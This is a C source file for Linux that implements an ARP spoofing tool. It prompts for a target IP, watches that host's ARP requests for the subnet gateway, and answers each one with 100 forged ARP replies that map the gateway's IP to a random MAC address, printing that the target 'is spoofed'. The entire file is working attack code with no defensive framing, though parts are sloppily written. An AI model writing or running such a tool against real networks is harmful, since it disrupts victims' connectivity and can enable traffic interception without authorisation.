#include <stdlib.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <linux/sockios.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>

#include <sys/signal.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if_arp.h>
#include <sys/uio.h>

#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <time.h>

typedef struct  send_arping{
    struct ethhdr ehdr;
    struct arphdr ahdr;
#if 0
    unsigned char arp_dst_hw[6];
    unsigned char arp_src_hw[6];
    unsigned short arp_type;
    unsigned short hw_type;
    unsigned short pro_type;
    unsigned char hw_len;
    unsigned char pro_len;
    unsigned short op;
#endif 
    unsigned char src_hw[6];
    struct in_addr src_ip;
    unsigned char dst_hw[6];
    struct in_addr dst_ip;
    unsigned char trailer[18];
}__attribute__((packed)) send_arping_t;

void print_hex(unsigned char *p, int len)
{
    int i;
    for (i=0; i<len; i++) {
        printf("%02X", p[i]);
        if (i != len-1)
            printf(":");
    }
}

char *gRandMac(char *mac, int len)
{
    char *ptr = mac;
    time_t cur;
    int tmp, i;
    time(&cur);

    srand(cur);
    for (i = 0; i < len; i++){
        do{
            tmp = (rand()%15);
        }while (tmp < 0 || tmp > 15);
        *(mac+i) = tmp;
    }

    return ptr;
}


int recv_pack(int sfd, int ifindex, struct in_addr *src, struct in_addr *traget, struct in_addr *gatWay)
{
    send_arping_t rbuf;
    struct sockaddr_ll from;
    int ret, len;
    char ipbuf[16], traget_mac[ETH_ALEN];
    int i = 0, isFirst = 0;
    len = sizeof(struct sockaddr_ll);


    while (1){
        memset(&rbuf, 0, sizeof(rbuf));
        ret = recvfrom(sfd, &rbuf, sizeof(rbuf), 0, NULL, NULL);
        if (-1 == ret){
            perror("recvfrom:");
            continue;
        }

        //printf("recvfrom:%d\n", ret);
        //if (rbuf.ahdr.ar_op != htons(ARPOP_REQUEST) && rbuf.ahdr.ar_op != htons(ARPOP_REPLY))
        if (rbuf.ahdr.ar_op != htons(ARPOP_REQUEST)){
            continue;
        }

        if (!isFirst){
            if (memcmp(&rbuf.src_ip, traget, sizeof(struct in_addr))){
                continue;
            }
        }else {
            if (memcmp(&rbuf.src_hw, traget_mac, ETH_ALEN)){
                continue;
            }
        }



#if 1
        if (!memcmp(&rbuf.src_ip, src, sizeof(struct in_addr))){
            continue;
        }
#endif 

        if (memcmp(&rbuf.dst_ip, gatWay, sizeof(struct in_addr))){
            continue;
        }

        if (!isFirst){
            memcpy(traget_mac, rbuf.src_hw, ETH_ALEN);
            isFirst++;
        }

        for (i = 0; i < 100; i++)
            send_pack(sfd, ifindex, &rbuf, gatWay);
        printf("The traget:%s  ", inet_ntoa(rbuf.src_ip));
        print_hex(rbuf.src_hw, ETH_ALEN);
        printf("    is spoofed!");
        printf("\n");
    }

    return 0;
}

void package(char *dst, unsigned char signal_value, int len)
{
    int i = 0;
    for (i; i < len; i++)
        *dst++ = signal_value;
}

int send_pack(int sfd, int ifindex, send_arping_t *rbuf, struct in_addr *gatWay)
{
    send_arping_t sbuf;
    int ret, i = 0;
    struct sockaddr_ll to;
    char mac[ETH_ALEN];
    memset(&sbuf, 0, sizeof(send_arping_t));

    memcpy(sbuf.ehdr.h_dest, rbuf->src_hw, ETH_ALEN);
    gRandMac(sbuf.ehdr.h_source, ETH_ALEN); 
    sbuf.ehdr.h_proto = htons(ETH_P_ARP);
    sbuf.ahdr.ar_hrd = htons(ARPHRD_ETHER);
    sbuf.ahdr.ar_pro = htons(ETH_P_IP);
    sbuf.ahdr.ar_hln = ETH_ALEN;
    sbuf.ahdr.ar_pln = 4;
    sbuf.ahdr.ar_op = htons(ARPOP_REPLY);

    memcpy(sbuf.src_hw, sbuf.ehdr.h_source, ETH_ALEN);    
    sbuf.src_ip = *gatWay;
    memcpy(sbuf.dst_hw, rbuf->src_hw, ETH_ALEN);
    sbuf.dst_ip = rbuf->src_ip;
    package(sbuf.trailer, htons(0), sizeof(sbuf.trailer));

    to.sll_family = AF_PACKET;
    memcpy(to.sll_addr, sbuf.ehdr.h_dest, ETH_ALEN);
    to.sll_halen = ETH_ALEN;
    to.sll_ifindex = ifindex;

    ret = sendto(sfd, &sbuf, sizeof(sbuf), 0, (struct sockaddr*)&to, sizeof(to));
    if (ret != sizeof(sbuf)) {
        perror("sendto:");
        return -1;
    }

    return 0;
}

char *gethostip(int sd, char *device, int *ifindex, char *ipstr, size_t iplen)
{
    if (ipstr == NULL)
        return NULL;
    int ret;
    struct ifconf conf;
    struct ifreq *ifr;
    struct sockaddr_in *saddr = NULL;
    struct ifreq req; 
    int num;
    int i;

    memset(&req, 0, sizeof(struct ifreq));
    char buff[BUFSIZ];
    conf.ifc_len = BUFSIZ;
    conf.ifc_buf = buff;

    ioctl(sd, SIOCGIFCONF, &conf);
    num = conf.ifc_len / sizeof(struct ifreq);
    ifr = conf.ifc_req;


    for(i=0;i < num;i++)
    {
        saddr = (struct sockaddr_in *)(&ifr->ifr_addr);

        ioctl(sd, SIOCGIFFLAGS, ifr);
        if(((ifr->ifr_flags & (IFF_LOOPBACK | IFF_NOARP)) == 0) && (ifr->ifr_flags & IFF_UP))
        {		
            printf("%s:	%s\n", ifr->ifr_name, inet_ntop(AF_INET, &saddr->sin_addr, ipstr, iplen));
            memcpy(device, ifr->ifr_name, strlen(ifr->ifr_name) + 1);
        }
        ifr++;
    }	

    memcpy(req.ifr_name, device, strlen(device));		
    ioctl(sd, SIOCGIFINDEX, &req);
    *ifindex = req.ifr_ifindex;	

    return ipstr;
}


char *gethostmac(int sd, char *device, char *pmac)
{
    int ret;
    struct ifreq req;
    struct sockaddr_in *saddr = NULL;
    memset(&req, 0, sizeof(req));
    memcpy(req.ifr_name, device, strlen(device));

    memset(pmac, 0, ETH_ALEN);
    ret = ioctl(sd, SIOCGIFHWADDR, &req);
    if (-1 == ret){
        perror("ioctl");
        exit(1);
    }
    memcpy(pmac, req.ifr_hwaddr.sa_data, ETH_ALEN);
    return pmac;
}

void init_sfd(int sfd, int ifindex)
{
    struct sockaddr_ll from;

    from.sll_family = AF_PACKET;
    from.sll_ifindex = ifindex;
    from.sll_protocol = htons(ETH_P_ARP);
    if (bind(sfd, (struct sockaddr*)&from, sizeof(struct sockaddr_ll)) == -1) {
        perror("bind");
        exit(2);
    }
}

char * packed_for_ip(char * ipsrc, char * iptmp)
{
    char *ipdst = iptmp;

    int j = 0;

    while (*ipsrc != '\0' && j != 3){
        *iptmp = *ipsrc;
        if (*ipsrc == '.')
            j++;
        iptmp++;
        ipsrc++;
    }
    *iptmp ='\0';

    return ipdst;

}

int main(int c, char **v)
{
    int sfd, ret, ifindex, i = 1;
    char ipsrc[16], ipdst[16], iptmp[16];
    char device[12], src_mac[ETH_ALEN];
    struct in_addr src, gatWay, traget;
    struct sockaddr_ll from;
    setuid(0);
    sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sfd == -1){
        perror("socket:");
        return 1;
    }
    gethostip(sfd, device, &ifindex, ipsrc, sizeof(ipsrc));
    inet_pton(AF_INET, ipsrc, &src.s_addr);
    gethostmac(sfd, device, src_mac);

    init_sfd(sfd, ifindex);
    packed_for_ip(ipsrc, iptmp);
    sprintf(ipdst, "%s%d", iptmp, i);
    inet_pton(AF_INET, ipdst, &gatWay.s_addr);

    printf("which one you want to spoof:    ");
    fflush(stdout);
    //printf("ipdst:%s    ipsrc:%s\n", ipdst, ipsrc);
    ret = read(0, iptmp, sizeof(iptmp));
    iptmp[ret - 1] = '\0';

    inet_pton(AF_INET, iptmp, &traget.s_addr);

    recv_pack(sfd, ifindex, &src, &traget, &gatWay);

    return 0;
}
